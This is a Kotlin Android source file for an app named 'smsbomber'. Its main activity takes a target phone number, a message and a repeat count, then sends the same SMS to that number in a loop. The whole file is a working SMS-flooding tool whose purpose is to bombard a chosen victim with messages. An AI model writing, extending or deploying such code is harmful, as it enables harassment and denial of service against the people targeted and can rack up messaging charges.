package com.rabarka.smsbomber

import android.content.pm.PackageManager
import androidx.appcompat.app.AppCompatActivity
import android.os.Bundle
import android.telephony.SmsManager
import android.widget.Toast
import androidx.core.app.ActivityCompat
import com.rabarka.smsbomber.databinding.ActivityMainBinding

class MainActivity : AppCompatActivity() {

    private lateinit var binding: ActivityMainBinding

    private lateinit var number: String
    private lateinit var messageBody: String
    private lateinit var noTimes: String

    override fun onCreate(savedInstanceState: Bundle?) {
        super.onCreate(savedInstanceState)
        binding = ActivityMainBinding.inflate(layoutInflater)
        setContentView(binding.root)

        if (ActivityCompat.checkSelfPermission(
                this,
                android.Manifest.permission.SEND_SMS
            ) != PackageManager.PERMISSION_GRANTED
        ) {
            ActivityCompat.requestPermissions(
                this,
                arrayOf(android.Manifest.permission.SEND_SMS),
                11
            )
        }
        binding.button.setOnClickListener {
            number = binding.phoneNumberET.text.toString()
            messageBody = binding.messageBodyET.text.toString()
            noTimes = binding.timeET.text.toString()

            if (noTimes.toInt() < 1){
                binding.timeET.setText("")
                Toast.makeText(this, "count error", Toast.LENGTH_SHORT).show()
            }else{
                for (i in 1..noTimes.toInt()) {
                    SmsManager.getDefault().sendTextMessage(number, null, messageBody, null, null)
                }
            }


        }

    }
}